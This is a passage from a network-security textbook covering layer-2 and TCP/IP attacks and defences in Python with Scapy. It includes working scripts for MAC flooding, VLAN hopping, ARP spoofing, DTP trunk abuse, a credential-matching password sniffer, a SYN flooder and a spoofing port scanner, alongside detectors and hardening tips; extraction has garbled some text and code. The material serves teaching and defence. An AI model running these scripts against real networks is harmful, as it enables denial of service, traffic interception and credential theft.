+5import sys
+67arp_watcher_db_file = "/var/cache/arp-watcher.db"
+8ip_mac = {}
+9
+10# Save ARP table on shutdown
+11def sig_int_handler(signum, frame):
+12 print "Got SIGINT. Saving ARP database..."
+13 try:
+14 f = open(arp_watcher_db_file, "w")
+15
+16 for (ip, mac) in ip_mac.items():
+17 f.write(ip + " " + mac + "\n")
+18
+19 f.close()
+20 print "Done."
+21 except IOError:
+22 print "Cannot write fil e " + arp_watcher_db_file
+23 sys.exit(1)
+
+40 4 Layer 2 Attacks
+24
+25
+26def watch_arp(pkt):
+27 # got is-at pkt (ARP response)
+28 if pkt[ARP].op == 2:
+29 print pkt[ARP].hwsrc + " " + pkt[ARP].psrc
+30
+31 # Device is new. Remember it.
+32 if ip_mac.get(pkt[ARP].psrc) == None:
+33 print "Found new device " + \
+34 pkt[ARP].hwsrc + " " + \
+35 pkt[ARP].psrc
+36 ip_mac[pkt[ARP].psrc] = pkt[ARP].hwsrc
+37
+38 # Device is known but has a different IP
+39 elif ip_mac.get(pkt[ARP].psrc) and \
+40 ip_mac[pkt[ARP].psrc] != pkt[ARP].hwsrc:
+41 print pkt[ARP].hwsrc + \
+42 "h a sg o tn e wi p"+\
+43 pkt[ARP].psrc + \
+44 " (old " + ip_mac[pkt[ARP].psrc] + ")"
+45 ip_mac[pkt[ARP].psrc] = pkt[ARP].hwsrc
+46
+4748signal(SIGINT, sig_int_handler)
+49
+50if len(sys.argv) < 2:
+51 print sys.argv[0] + " <iface>"
+52 sys.exit(0)
+53
+54try:
+55 fh = open(arp_watcher_db_file, "r")
+56except IOError:
+57 print "Cannot read file " + arp_watcher_db_file
+58 sys.exit(1)
+59
+60for line in fh:
+61 line.chomp()
+62 (ip, mac) = line.split(" ")
+63 ip_mac[ip] = mac
+64
+65sniff(prn=watch_arp,
+66 filter="arp",
+67 iface=sys.argv[1],
+68 store=0)
+
+4.4 MAC-Flooder 41
+At the start we deﬁne a signal handler in sig_int_handler() that gets
+called if the user interrupts the program. This function will save all known IP toMAC resolutions in the ip_mac dictionary to a ﬁle. Afterwards we read those
+ARP db ﬁle to initialize the program with all currently known resolutions or exitif the ﬁle cannot be read. Than we loop line by line through the ﬁles content andsplit each line into IP and MAC to save them in the ip_mac dictionary. Now we
+call the already known function sniff() that will invoke the callback function
+watch_arp for every received ARP packet.
+The function watch_arp implements the real logic of the program. When the
+sniffed packet is a is-at packet and therefore an ARP response than we ﬁrst check
+if the IP exists in the ip_mac dictionary. If we didn’t ﬁnd an entry the device is new
+and shows a message to the screen, oth erwise we compare the MAC address with
+the MAC in our dictionary. If it differs the response is probably forged and we printa message to the screen. In both cases the dictionary gets updated with the newinformation.
+4.4 MAC-Flooder
+Switches like other computers have a limited size of memory that’s also true forthe table holding MAC address information used by the switch to remember whichMAC is on which port as well as its inte rnal ARP cache. Sometimes switches react
+a bit weirdly if their buffers overﬂow. This can lead from denial of service up togiving up switching and behaving like a normal hub. In hub mode the overall highertrafﬁc raise is not the only problem you would have thus all connected computerscould see the complete trafﬁc without a dditional actions. You should test how your
+switches react on these exceptions and that’s what the next script is good for. Itgenerates random MAC addresses and sends them to your switch until the buffer isfull.
+1#!/usr/bin/python
+2
+3import sys
+4from scapy.all import *
+5
+6packet = Ether(src=RandMAC(" *:*:*:*:*:*"),
+7 dst=RandMAC(" *:*:*:*:*:*")) / \
+8 IP(src=RandIP(" *.*.*.*"),
+9 dst=RandIP(" *.*.*.*")) / \
+10 ICMP()
+11
+12if len(sys.argv) < 2:
+13 dev = "eth0"
+14else:
+
+42 4 Layer 2 Attacks
+15 dev = sys.argv[1]
+16
+17print "Flooding net with random packets on dev " + dev
+18
+19sendp(packet, iface=dev, loop=1)
+RandMAC andRandIP take care that each byte of the address is randomly
+generated. The rest is done by the loop parameter of the function sendp() .
+4.5 VLAN Hopping
+VLANs are no security feature a s already mentioned in Sect. 2.5, because the
+additional security of a modern, tagge d VLAN on the one hand depends on a header
+added to the packet including the VLAN Id. Such a packet can be easily created withScapy. Lets say our computer is connected to VLAN 1 and wants to ping anotherone on VLAN 2.
+1#!/usr/bin/python
+2
+3from scapy.all import *
+4
+5packet = Ether(dst="c0:d3:de:ad:be:ef") / \
+6 Dot1Q(vlan=1) / \
+7 Dot1Q(vlan=2) / \
+8 IP(dst="192.168.13.3") / \
+9 ICMP()
+10
+11sendp(packet)
+First we set the header including our VLAN tag into the packet and afterwards
+the one of the destination host. The switch will remove the ﬁrst tag, than decidehow to react on the packet, seeing the second tag with VLAN Id 2 he decides toforward it to that vlan. On some switches this attack will only be successful if itsconnected to other VLAN enabled switche s via stacking, because otherwise they
+use port based VLAN.
+4.6 Let’s Play Switch
+Linux runs on a lot of embedded network devices; therefore it should not besurprising that one can turn their own co mputer into a full featured VLAN switch
+thanks to Linux. All you need is the tool vconfig . After installing the required
+
+4.7 ARP Spooﬁng Over VLAN Hopping 43
+packet depending on your distribution you can add your host to another VLAN with
+the following command.
+vconfig add eth0 1
+Afterwards you must remember to start the new device and give it an IP address
+of the VLAN network!
+ifconfig eth0.1 192.168.13.23 up
+4.7 ARP Spooﬁng Over VLAN Hopping
+VLANs limit broadcast trafﬁc to the ports belonging to the same VLAN thereforewe cannot by default react to all ARP requests b ut have to proactively tell the victim
+our MAC every few seconds like seen in the ﬁrst ARP spooﬁng example. The codeis identical except for the fact that we tag e very packet for our and than additionally
+for the destination VLAN.
+1#!/usr/bin/python
+2
+3import time
+4from scapy.all import sendp, ARP, Ether, Dot1Q
+56iface = "eth0"
+7target_ip = ’192.168.13.23’
+8fake_ip = ’192.168.13.5’
+9fake_mac = ’c0:d3:de:ad:be:ef’
+10our_vlan = 1
+11target_vlan = 2
+12
+13packet = Ether() / \
+14 Dot1Q(vlan=our_vlan) / \
+15 Dot1Q(vlan=target_vlan) / \
+16 ARP(hwsrc=fake_mac,
+17 pdst=target_ip,
+18 psrc=fake_ip,
+19 op="is-at")
+20
+21while True:
+22 sendp(packet, iface=iface)
+23 time.sleep(10)
+Luckily its not that complicated to prot ect against those kind of VLAN attacks:
+Just use physically divided switches if you really want to separate your networks!
+
+44 4 Layer 2 Attacks
+4.8 DTP Abusing
+DTP (Dynamic Trunking Protocol) is a proprietary protocol invented by Cisco to
+let switches dynamically discuss if a port should be a trunk port. A trunk portis normally used to interconnect switches and routers to share some or all knownVLANs.
+You need to install the development version of Scapy to be able to execute the
+following code. To check out the sources please ﬁrst install Mercurial and afterwardstype the next line into the console to clone the Scapy repository.
+hg clone http://hg.secdev.org/scapy scapy
+If you want to keep track with the latest version of Scapy you only have to update
+the checkout from time to time.
+cd scapy
+hg pull
+Now you can exchange the old version of Scapy with the latest and greatest.
+pip uninstall Scapy
+cd scapy
+python setup.py install
+Thanks to the DTP protocol and its property to completely overlook any kind of
+security we now can send a single Dynamic-Desirable packet to every DTP enabledCisco device and ask it to change our port into a trunk port.
+1#!/usr/bin/python
+23import sys
+4from scapy.layers.l2 import Dot3 , LLC, SNAP
+5from scapy.contrib.dtp import *
+6
+7if len(sys.argv) < 2:
+8print sys.argv[0] + " <dev>"
+9sys.exit()
+1011negotiate_trunk(iface=sys.argv[1])
+As an optional parameter you can set the MAC address of the spoofed neighbor
+switch if none is set a random one will be automatically generated.
+The attack can last some minutes, but an attacker doesn’t care about the delay,
+because they know what they get in excha nge the possibility to connect to every
+VLAN!
+vconfig add eth0 <vlan-id>
+ifconfig eth0.<vlan-id> <ip_of_vlan> up
+There’s no really good reason to use DTP so just disable it!
+
+4.9 Tools 45
+4.9 Tools
+4.9.1 NetCommander
+NetCommander is a simple ARP spoofer. It searches for active computers on
+the network by sending ARP requests to every possible IP. Afterwards you canchoose a connection to be hijacked and NetCommander will automatically spoofthe connection between those hosts and the default gateway bidirectionally everyfew seconds.
+The source code of the tool can be downloaded from github.com/evilsocket/
+NetCommander
+4.9.2 Hacker’s Hideaway ARP Attack Tool
+Hacker’s Hideaway ARP Attack Tool has a few more features than NetCommander.Apart from the spooﬁng of a speciﬁc connection it supports passive spooﬁng of allARP requests of a source IP as well as MAC ﬂooding.
+The download link of the tool is packetstormsecurity.org/ﬁles/81368/hharp.py.
+tar.bz2
+4.9.3 Loki
+Loki is a layer 2 and 3 attack tool like Yersinia. It can be extended by plugins andhas a nice GUI. It implements attacks like ARP spooﬁng and -ﬂooding, BGP andRIP route injection and even attacks on quite uncommon protocols like HSRP andVRRP.
+The source code of Loki can be grabbed from the site www.c0decafe.de/loki.
+html.
+
+Chapter 5
+TCP/IP Tricks
+Abstract Next we want to take a tour through the TCP/IP protocol family. This
+forms the heart of the Internet and makes most computer networks in the world tick.The chapter topic is named TCP/IP, but we w ill also cover network snifﬁng here that
+expands over all layers.
+5.1 Required Modules
+Thanks to Scapy its very easy to create your own packets and send them on a
+journey, as already seen in Chap. 4. If you have not installed Scapy yet, proceed
+with the following line:
+pip install Scapy
+5.2 A Simple Sniffer
+Let us try to keep it as simple as possibl e. The Internet, as well as local area
+networks, consist of a huge number of services. You use HTTP(S) for surﬁng webpages, SMTP to send emails, POP3 or IMAP to read emails, ICQ, IRC, Skype orJabber to chat and so on.
+Most people should by now have heard that HTTP without the S is insecure and
+should not be used to send one’s bank account data through the net. However, mostprotocols for daily use are plaintext protocols, like ICQ or SMTP and IMAP/POP3.Facebook, the biggest social network o f the world has recently adopted HTTPS
+as default (mid 2011). One can activate SSL encryption for most commonly usedprotocols or install a SSL proxy in front of a service if it doesn’t support SSL byitself, but only a few people care about data security and encryption.
+Unencrypted network trafﬁc is the low ha nging fruit every attacker is searching
+for. Why should an attacker try to crack passwords if he can easily read them? Whyshould they try to break into the application server if they could hijack the currentadmin session and insert his commands by using IP spooﬁng (Sect. 5.6)?
+With a network sniffer like Tcpdump ( http://www.tcpdump.org )o rW i r e s h a r k
+(http://www.wireshark.org ) the admin can illustratively demonstrate its users that
+one can read their trafﬁc if they don’t use encryption. Of course you should have the
+© Springer-Verlag Berlin Heidelberg 2015
+B. Ballmann, Understanding Network Hacks , DOI 10.1007/978-3-662-44437-5_547
+
+48 5 TCP/IP Tricks
+authorization for this demonstration, as an admin should never invade the privacy of
+its users. Without authorization, you should only sniff your own or the packets of anintruder to your network.
+The next code snippet should demonstrate how easy it is to write your own sniffer
+in Python. It uses the famous PCAP library from tcpdump.org .T ob ea b l et oe x e c u t e
+the source code you must also install the Python module impacket and pcapy fromCore Security.
+pip install impacket pcapy
+1#!/usr/bin/python
+23import sys
+4import getopt
+5import pcapy
+6from impacket.ImpactDecoder import EthDecoder
+78
+9dev = "eth0"
+10filter = "arp"
+11decoder = EthDecoder()
+12
+13# This function will be called for every packet
+14# and just print it
+15def handle_packet(hdr, data):
+16 print decoder.decode(data)
+17
+1819def usage():
+20 print sys.argv[0] + " -i <dev> -f <pcap_filter>"
+21 sys.exit(1)
+22
+23# Parsing parameter
+24try:
+25 cmd_opts = "f:i:"
+26 opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
+27except getopt.GetoptError:
+28 usage()
+29
+30for opt in opts:
+31 if opt[0] == "-f":
+32 filter = opt[1]
+33 elif opt[0] == "-i":
+34 dev = opt[1]
+35 else:
+
+5.3 Reading and Writing PCAP Dump Files 49
+36 usage()
+37
+38# Open device in promisc mode
+39pcap = pcapy.open_live(dev, 1500, 0, 100)
+40
+41# Set pcap filter
+42pcap.setfilter(filter)
+4344# Start sniffing
+45pcap.loop(0, handle_packet)
+The tool sets the network card eth0 into the so called promiscuous mode .T h i s
+instructs the kernel to read in every network packet, not only those addressed tothe card itself. With the use of the variable filter you can set a PCAP ﬁlter
+expression. In the example this ﬁlter ensures that only ARP packets get sniffed.Other possible ﬁlters would be e.g. tcp and port 80 , to read HTTP Trafﬁc or
+“(udp or icmp) and host 192.168.1.1”, to see only ICMP- and UDP-Trafﬁc to andfrom the IP 192.168.1.1. The documentation of the PCAP ﬁlter language can befound on tcpdump.org .
+The function open_live() opens a network interface for reading packets.
+You can otherwise read packets from a PCAP dump ﬁle. The parameters we applytoopen_live() aresnaplen to deﬁne how many bytes of a packets payload
+should be read, a boolean value for setting the promiscuous mode and a timeout inmilliseconds beside the network interface to read from.
+Afterwards the packets are read from the network card in an endless loop. For
+every received packet the function handle_packet() gets called. It decodes the
+packet with the help of the EthDecoder class. We use EthDecoder here instead
+ofArpDecoder , because the PCAP ﬁlter can be speciﬁed by the user with the use
+of the -f parameter.
+5.3 Reading and Writing PCAP Dump Files
+Next we develop a script that will not display the caught data packets on screen inhuman readable format, but save them in a PCAP dump ﬁle for further processing
+by other network tools. In case the script gets a ﬁle as parameter it will try to read itand print its contents by utilizing EthDecoders as shown in the ﬁrst example.
+1#!/usr/bin/python
+23import sys
+4import getopt
+5import pcapy
+6from impacket.ImpactDecoder import EthDecoder
+7from impacket.ImpactPacket import IP
+
+50 5 TCP/IP Tricks
+8
+9dev = "eth0"
+10decoder = EthDecoder()
+11input_file = None
+12dump_file = "sniffer.pcap"
+13
+14
+15def write_packet(hdr, data):
+16 print decoder.decode(data)
+17 dumper.dump(hdr, data)
+1819
+20def read_packet(hdr, data):
+21 ether = decoder.decode(data)
+22 if ether.get_ether_type() == IP.ethertype:
+23 iphdr = ether.child()
+24 tcphdr = iphdr.child()
+25 print iphdr.get_ip_src() + ":" + \
+26 str(tcphdr.get_th_sport()) + \
+27 " -> " + iphdr.get_ip_dst() + ":" + \
+28 str(tcphdr.get_th_dport())
+29
+30
+31def usage():
+32 print sys.argv[0] + """
+33 -i <dev>
+34 -r <input_file>
+35 -w <output_file>"""
+36 sys.exit(1)
+37
+38
+39# Parse parameter
+40try:
+41 cmd_opts = "i:r:w:"
+42 opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
+43except getopt.GetoptError:
+44 usage()
+45
+46for opt in opts:
+47 if opt[0] == "-w":
+48 dump_file = opt[1]
+49 elif opt[0] == "-i":
+50 dev = opt[1]
+51 elif opt[0] == "-r":
+52 input_file = opt[1]
+
+5.4 Password Sniffer 51
+53 else:
+54 usage()
+5556# Start sniffing and write packet to a pcap dump file
+57if input_file == None:
+58 pcap = pcapy.open_live(dev, 1500, 0, 100)
+59 dumper = pcap.dump_open(dump_file)
+60 pcap.loop(0, write_packet)
+61
+62# Read a pcap dump file and print it
+63else:
+64 pcap = pcapy.open_offline(input_file)
+65 pcap.loop(0, read_packet)
+The function pcap.dump_open() opens a PCAP dump ﬁle for writing
+and returns a Dumper object, which provides a dump() method to write the
+header and payload of the packet. For reading a PCAP ﬁle we apply the method
+open_offline() instead of the further used method open_live() and give it
+the ﬁle to open as exclusive parameter. The rest of the reading process is analogous.
+The example shows an improvement on the decoding of the packet data. We
+output all data of the packet at once by using the __str__ method of Ethernet in
+ImpactPacket. Now we only decode the IP and TCP headers instead and display thesource and destination ip and port as an example.
+The header of higher layers can be comfortably accessed by calling the
+child() method. The rest of the code are simple getters to the desired properties
+of the protocol.
+5.4 Password Sniffer
+The danger of unencrypted protocols can most effectively be demonstrated withthe help of a password sniffer. Even fellow men, that “do not have anything tohide”, recognize that the interception of their username and password is an act thatendangers their privacy and they would like to avoid it if possible. Therefore we willnow write a program that will try to hunt for username and password combination bymatching predeﬁned strings to the packets payload and dump them on the display.To do so, we will adapt the source code of the Sect. 5.2only a little.
+1#!/usr/bin/python
+23import sys
+4import re
+5import getopt
+6import pcapy
+7from impacket.ImpactDecoder import EthDecoder, IPDecoder, TCPDecoder
+
+52 5 TCP/IP Tricks
+8
+9# Interface to sniff on
+10dev = "eth0"
+1112# Pcap filter
+13filter = "tcp"
+14
+15# Decoder for all layers
+16eth_dec = EthDecoder()
+17ip_dec = IPDecoder()
+18tcp_dec = TCPDecoder()
+19
+20# Patterns that match usernames and passwords
+21pattern = re.compile(r"""(?P<found>(USER|USERNAME|PASS|
+22 PASSWORD|LOGIN|BENUTZER|PASSWORT|AUTH|
+23 ACCESS|ACCESS_?KEY|SESSION|
+24 SESSION_?KEY|TOKEN)[=:\s].+)\b""",
+25 re.MULTILINE|re.IGNORECASE)
+262728# This function will be called for every packet, decode it and
+29# try to find a username or password in it
+30def handle_packet(hdr, data):
+31 eth_pkt = eth_dec.decode(data)
+32 ip_pkt = ip_dec.decode(eth_pkt.get_data_as_string())
+33 tcp_pkt = tcp_dec.decode(ip_pkt.get_data_as_string())
+34 payload = ip_pkt.get_data_as_string()
+35
+36 match = re.search(pattern, payload)
+37 if not tcp_pkt.get_SYN() and not tcp_pkt.get_RST() and \
+38 not tcp_pkt.get_FIN() and match and \
+39 match.groupdict()[’found’] != None:
+40 print "%s:%d -> %s:%d" % (ip_pkt.get_ip_src(),
+41 tcp_pkt.get_th_sport(),
+42 ip_pkt.get_ip_dst(),
+43 tcp_pkt.get_th_dport())
+44 print "\t%s\n" % (match.groupdict()[’found’])
+4546
+47def usage():
+48 print sys.argv[0 ]+"- i <dev> -f <pcap_filter>"
+49 sys.exit(1)
+5051
+52# Parsing parameter
+53try:
+54 cmd_opts = "f:i:"
+
+5.5 Sniffer Detection 53
+55 opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
+56except getopt.GetoptError:
+57 usage()
+5859for opt in opts:
+60 if opt[0] == "-f":
+61 filter = opt[1]
+62 elif opt[0] == "-i":
+63 dev = opt[1]
+64 else:
+65 usage()
+66
+67# Start sniffing
+68pcap = pcapy.open_live(dev, 1500, 0, 100)
+69pcap.setfilter(filter)
+70print "Sniffing passwords on " + str(dev)
+71pcap.loop(0, handle_packet)
+This time we ﬁlter TCP trafﬁc, because the author is not aware of any UDP based
+protocols that have a login or authentication mechanism.
+For a decoder we additionally deﬁne IPDecoder andTCPDecoder to extract
+the IP- and TCP header by applying the function handle_packet . Therefore we
+provide the packet from the previous layer to the decoder, though IPDecoder getsthe ETH packet, the TCPDecoder an IP packet and so forth.
+The payload of the IP packet can be accessed as an ASCII-string with the
+help of the method get_data_as_string() , which sometimes leads to ugly
+undisplayable characters, especially when dumping binary data. Therefore we ﬁrstmatch the payload against a regular expression (Sect. 3.9) to make sure it contains a
+string like User, Pass, Password or Login. In contrast to regular password sniffers,our sniffer does not just search in predeﬁned protocols but in all TCP trafﬁc andtries to detect other authentication mechanisms like session keys and cookies besideusername and password combinations.
+5.5 Sniffer Detection
+Malicious sniffer can be a real threat for the security of your network, thus it would
+be nice to have a technique to detect them. Locally it is an easy task. Just check allnetwork interface to see if they are set into promisc mode. If you are lucky, and norootkit got installed on the system so the kernel will hide information from you, youget a list of interfaces that run a sniffer.
+ifconfig -a | grep PROMISC
+The kernel logs if a network interface gets set into the promisc mode. This
+information can be found in /var/log/messages / syslog or kern.log depending onthe syslog conﬁguration of your system.
+
+54 5 TCP/IP Tricks
+cat /var/log/messages |grep promisc
+It would be more elegant to have a way to detect sniffers remotely. Fortunately,
+there are two techniques to do so. The ﬁrst one is to overﬂow the network withtrafﬁc and continuously ping all connected hosts. In theory a host running a snifferwill respond slower due to more CPU usage for decoding the trafﬁc. This variantis rude, because it wastes lot of resources and it is not very reliable as it will showup systems that have a high load for other reasons thus as a big database query orcompiling a complex program.
+The second method to ﬁnd a sniffer from the distance is based on the trick
+that a system that is running in promisc mode won’t reject any packet and reacton all. Therefore we create an ARP packet with a random, unused MAC addressother than broadcast and send it to every single host. Systems that are not runningin promisc mode will discard the packet being not addressed for their MAC, butsnifﬁng systems will send us an response.
+This technique is described in more detail in the paper www.securityfriday.
+com/promiscuous_detection_01.pdf and implemented in the Scapy function
+promiscping() thus with Scapy its an easy one liner to detect sniffer remotely!
+1#!/usr/bin/python
+2
+3import sys
+4from scapy.all import promiscping
+5
+6if len(sys.argv) < 2:
+7print sys.argv[0] + " <net>"
+8sys.exit()
+9
+10promiscping(sys.argv[1])
+The network can be either deﬁned with CIDR block (192.168.1.0/24) or by using
+a wildcard (192.168.1.*).
+5.6 IP-Spooﬁng
+IP-Spooﬁng is the forgery of IP addresses. The source address is not the IP of the realnetwork device the packet was sent over, but a manually inserted one. Attackers usethis technique either to hide the source of the attack or to circumvent a packet-ﬁlteror other security layers like tcp wrappe r that block or accept connections depending
+on their source ip address.
+In the previous chapter we already used Scapy to sniff and create ARP- and
+DTP packets. Now we expand our excursion into the wonderful world of Scapy byimplementing a simple IP Spooﬁng program. It will send an ICMP-Echo-Requestpacket also known as Ping with a spoofed source IP to a remote host.
+
+5.7 SYN-Flooder 55
+1#!/usr/bin/python
+2
+3import sys
+4from scapy.all import send, IP, ICMP
+5
+6if len(sys.argv) < 3:
+7print sys.argv[0] + " <src_ip> <dst_ip>"
+8sys.exit(1)
+9
+10packet = IP(src=sys.argv[1], dst=sys.argv[2]) / ICMP()
+11answer = send(packet)
+12
+13if answer:
+14 answer.show()
+We create an IP packet that is included into an ICMP packet by deﬁning
+IP() / ICMP() . This somewhat unusual but handy declaration syntax is made
+possible by Scapy by overriding the / operator with the help of the __div__
+method.
+The IP packet gets the source and destination IP as a parameter. The resulting
+packet object is dumped on the screen by calling the show() method on it
+(show2() would only display layer 2). Afterwards we send it by calling send()
+(here too we could use sendp() for layer 2). Last but not least if we get any
+response packets it is being printed on the screen. Of course we can only receive areply if it is sent to our network card. Therefore it could be necessary to implementa Mitm attack (Sect. 2.19) if our host is not connected to the same hub as the
+target system. In our case we do not have to care about a Mitm attack, becauseScapy inserts our MAC address as source address and the destination MAC of thedestination IP automatically. Thus we can be sure the reply packet is directly sentback to us.
+You can protect against IP spooﬁng by signing and encrypting all IP packets. A
+common case would be the protocols AH or ESP of the IPSec protocol family.
+5.7 SYN-Flooder
+Another variant of DOS (Denial of Service) is SYN ﬂooding. It overﬂows a targetsystem with spoofed TCP packets, which have the SYN ﬂag set, until it stopsaccepting new connections. Remember packets with a set SYN ﬂag are used toinitiate the three-way-handshake and are responded with a SYN/ACK packet onan open port. If the requesting side does not send the corresponding ACK theconnection stays in the so called half-open state until a timeout occurs. In case toomany connections are in half-open state the host wont accept any further connection.
+
+56 5 TCP/IP Tricks
+Of course you want to know how your systems react on this exceptional state thus
+we program a simple SYN ﬂooder with a few lines of Python code.
+1#!/usr/bin/python
+23import sys
+4from scapy.all import srflood, IP, TCP
+56if len(sys.argv) < 3:
+7print sys.argv[0] + " <spoofed_source_ip> <target>"
+8sys.exit(0)
+9
+10packet = IP(src=sys.argv[1], dst=sys.argv[2]) / \
+11 TCP(dport=range(1,1024), flags="S")
+12
+13srflood(packet, store=0)
+Usually Syn ﬂood attacks are combined with IP spooﬁng, otherwise the attacker
+may DOS himself or herself with the corresponding response packets. Furthermorethe attacker could DOS another system by spooﬁng its IP and even raise the trafﬁc,because the spoofed system will send b ack a RST packet for every SYN/ACK it
+receives.
+Luckily nowadays SYN ﬂooding attacks are not such a big deal anymore as they
+were a decade ago.
+On Linux you can activate SYN cookies by executing the following:
+echo 1 > /proc/sys/net/ipv4/tcp_syncookies
+On BSD- and Mac-OS-X systems similar mech anisms exist. For further informa-
+tion on SYN cookies please have a look at the tutorial from Daniel Bernstein underhttp://cr.yp.to/syncookies.html .
+5.8 Port-Scanning
+For sure in a chapter about TCP/IP hacking there has to be a classical port scanner.
+A port-scanner is a program that will just try to establish a connection port after
+port and afterwards list all the successful connections.
+This technique is not only scr eamingly loud, because it tries to make a full three-
+way handshake for every port, but also slow. It would be far more elegant to justsend a SYN packet to every port and see if we get a SYN/ACK (for open port) or aRST (closed port) or no (ﬁltered port) response back. That’s exactly the tool we aregoing to implement now!
+1#!/usr/bin/python
+2
+
+5.8 Port-Scanning 57
+3import sys
+4from scapy.all import sr, IP, TCP
+56if len(sys.argv) < 2:
+7print sys.argv[0] + " <host> <spoofed_source_ip>"
+8sys.exit(1)
+9
+1011# Send SYN Packets to all 1024 ports
+12if len(sys.argv) == 3:
+13 packet = IP(dst=sys.argv[1], src=sys.argv[2])
+14else:
+15 packet = IP(dst=sys.argv[1])
+16
+17packet /= TCP(dport=range(1,1025), flags="S")
+1819answered, unanswered = sr(packet, timeout=1)
+20
+21r e s={ }
+22
+23# Process unanswered packets
+24for packet in unanswered:
+25 res[packet.dport] = "filtered"
+2627# Process answered packets
+28for (send, recv) in answered:
+29 # Got ICMP error message
+30 if recv.getlayer("ICMP"):
+31 type = recv.getlayer("ICMP").type
+32 code = recv.getlayer("ICMP").code
+33 # Port unreachable
+34 if code == 3 and type == 3:
+35 res[send.dport] = "closed"
+36 else:
+37 res[send.dport] = "Got ICMP with type " + \
+38 str(type) + \
+39 " and code " + \
+40 str(code)
+41 else:
+42 flags = recv.getlayer("TCP").sprintf("%flags%")
+43
+44 # Got SYN/ACK
+45 if flags == "SA":
+46 res[send.dport] = "open"
+47
+
+58 5 TCP/IP Tricks
+48 # Got RST
+49 elif flags == "R" or \
+50 flags == "RA":
+51 res[send.dport] = "closed"
+52
+53 # Got something else
+54 else:
+55 res[send.dport] = "Got packet with flags " + \
+56 str(flags)
+57
+58# Print res
+59ports = res.keys()
+60ports.sort()
+61
+62for port in ports:
+63 if res[port] != "closed":
+64 print str(port) + ": " + res[port]
+The tool scans only the ﬁrst 1024 ports since those are the privileged ports
+reserved for services such as SMTP, HTTP, FTP, SSH etc. If you like, you can ofcourse adjust the code to scan all 65536 possible ports. Optionally, the program willaccept an IP address to let the attack look like it came from a different source. To beable to evaluate the response packets it must still be possible for our host to receivethe trafﬁc of the spoofed IP.
+The function range() is new in this source code. It returns a list of numbers
+from 1 to 1024. Also new is the function sr() that does not only send the packets
+on layer 3 but also reads the corresponding response packets. The list of responsepackets consists of tupels that include the packet that was send as ﬁrst item and theresponse packet as second item.
+We iterate over all response packets and check if it is either an ICMP- or a TCP
+packet by applying the getlayer() method, which returns the header of the given
+protocol.
+If the packet is an ICMP packet, we test the type and code that signals the type
+of the error. If it is a TCP packet, we examine the ﬂags set to determine the meaningof the response. The ﬂags are normally a long integer containing the possible ﬂagsas bit set or unset. This is not easy for us to handle therefore we convert the ﬂagsto a string with the help of the method lstinline|sprintf|. SAsignals that the SYN
+and ACK ﬂags are both set and therefore the port seems to be open. RorRAmeans
+the RST or RST and ACK ﬂags are set and thus the port is closed otherwise weprotocolize the ﬂags set.
+Besides SYN scanning, there are several other techniques to scan for open ports
+such as Null-, FIN-, and XMAS-Scans. They use packets where no ﬂag, only the
+FIN ﬂag or all ﬂags are set. RFC conform systems will respond with a RST packet
+
+5.9 Port-Scan Detection 59
+if the port is closed or not at all if it is open or ﬁltered, but keep in mind modern
+network intrusion detection systems will send alerts on such scans.
+Better trained attackers won’t scan a target sequentially, but random ports on
+random hosts with a random timeout to avoid being detected Thus network intrusiondetection systems keep an eye on the number of tried ports per destination host froma single source IP and if it gets too high they log it as port-scan and maybe evenblock the source IP for a given timespan. Try to scan your network and examinehow your NIDS reacts. Also, try to scan with different ﬂags set or write a programthat will only scan some interesting ports in random order such as 21, 22, 25, 80 and443.
+The best documentation about port-scan techniques on the internet is of course
+written by Fyodor the inventor of the famous NMAP nmap.org/book/man-port-
+scanning-techniques.html , and you should deﬁnitely read it at least once.
+5.9 Port-Scan Detection
+After writing some source code to scan for ports we now want to write a program to
+detect those scans. The program will need to remember all destination ports and the
+request time in Unix format (seconds since 1970/01/01) for every source IP. Then itwill check if the number of requested ports is above the given maximum and treatsthe affair as a port-scan if it is.
+The two variables nr_of_diff_ports andportscan_timespan deﬁne
+how many ports must be requested in how many seconds. If the amount is reachedwe iterate over all requested ports and delete the entries that don’t fall into ourtimespan. If the source IP still reaches the number of necessary requested ports weprint a message and all saved information will be deleted to avoid multiple alerts fora single scan.
+1#!/usr/bin/python
+2
+3import sys
+4from time import time
+5from scapy.all import sniff
+6
+7ip_to_ports = dict()
+8
+9# Nr of ports in timespan seconds
+10nr_of_diff_ports = 10
+11portscan_timespan = 10
+1213
+14def detect_portscan(packet):
+15 ip = packet.getlayer("IP")
+
+60 5 TCP/IP Tricks
+16 tcp = packet.getlayer("TCP")
+17
+18 # Remember scanned port and time in unix format
+19 ip_to_ports.setdefault(ip.src, {})\
+20 [str(tcp.dport)] = int(time())
+21
+22 # Source IP has scanned too much different ports?
+23 if len(ip_to_ports[ip.src]) >= nr_of_diff_ports:
+24 scanned_ports = ip_to_ports[ip.src].items()
+25
+26 # Check recorded time of each scan
+27 for (scanned_port, scan_time) in scanned_ports:
+28
+29 # Scanned port not in timeout span? Delete it
+30 if scan_time + portscan_timespan < int(time()):
+31 del ip_to_ports[ip.src][scanned_port]
+32
+33 # Still too much scanned ports?
+34 if len(ip_to_ports[ip.src]) >= nr_of_diff_ports:
+35 print "Portscan detected fro m " + ip.src
+36 print "Scanned ports " + \
+37 ",".join(ip_to_ports[ip.src].keys()) + \
+38 "\n"
+3940 del ip_to_ports[ip.src]
+41
+42if len(sys.argv) < 2:
+43 print sys.argv[0] + " <iface>"
+44 sys.exit(0)
+45
+46sniff(prn=detect_portscan,
+47 filter="tcp",
+48 iface=sys.argv[1],
+49 store=0)
+We ﬁlter only TCP trafﬁc to keep the example as simple as possible. You should
+be able to extend the code for UDP scan detection without much effort.
+Another extension possibility would be to not only log port-scans, but also block
+them. A simple possibility is to add a reject or drop rule to Iptables for the scanningsource IP. Such a rule would look like the following:
+os.system("iptables -A INPUT -s " + ip_to_ports[ip.src] + \
+" -j DROP")
+It should be remarked that this technique can be dangerous. A keen attacker
+could use IP spooﬁng to deny you access t o a whole network or to just ban your
+
+5.10 ICMP-Redirection 61
+DNS servers. Therefore you should also implement a whitelisting and a timeout
+mechanism to avoid blocking essential network resources like your default gateway.Another threat is if an attacker is able to inject any characters as source IP this can
+lead to a command injection attack (see Sect. 7.10). The input should be sanitized
+for characters interpreted by shells.
+5.10 ICMP-Redirection
+Most network administrators nowadays know of man-in-the-middle attacks throughARP-cache-poisoning described in Sect. 4.2. Much more silently than ARP spooﬁng
+is a Mitm implemented with an ICMP-Redirection. Thus the attack only needsa single packet to intercept the whole trafﬁc to a speciﬁed route like the defaultgateway.
